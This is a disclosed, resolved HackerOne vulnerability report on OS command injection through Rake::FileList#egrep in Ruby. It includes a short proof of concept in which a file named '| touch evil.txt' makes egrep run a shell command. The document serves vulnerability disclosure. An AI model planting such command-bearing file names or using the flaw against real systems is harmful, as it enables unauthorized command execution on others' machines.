---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '651518'
original_report_id: '651518'
title: OS Command Injection via egrep in Rake::FileList
weakness: OS Command Injection
team_handle: ruby
created_at: '2019-07-20T04:16:53.118Z'
disclosed_at: '2019-08-29T03:12:56.050Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 61
asset_identifier: https://github.com/ruby/ruby
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- os-command-injection
---

# OS Command Injection via egrep in Rake::FileList

## Metadata

- HackerOne Report ID: 651518
- Weakness: OS Command Injection
- Program: ruby
- Disclosed At: 2019-08-29T03:12:56.050Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

When a file which has command file name of stating with `|` is in `Rake::FileList`, then `egrep` will execute the command.

# How to reproduce

PoC (`poc_rake.rb`) is the following.

```ruby
require 'rake'

list = Rake::FileList.new(Dir.glob('*'))
p list
list.egrep(/something/)
```

Example of executing.

```
% ls -1
Gemfile
Gemfile.lock
poc_rake.rb
vendor
| touch evil.txt
% bundle exec ruby poc_rake.rb
["poc_rake.rb", "Gemfile", "Gemfile.lock", "| touch evil.txt", "vendor"]
poc_rake.rb:6:list.egrep(/something/)
Error while processing 'vendor': Is a directory @ io_fillbuf - fd:7 vendor
% ls -1
Gemfile
Gemfile.lock
evil.txt
poc_rake.rb
vendor
| touch evil.txt
```

`evil.txt` was created.

## Impact

An attacker must deploy a file containing command names in the target environment, assuming that this attack is successful. If that would be a serious problem.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
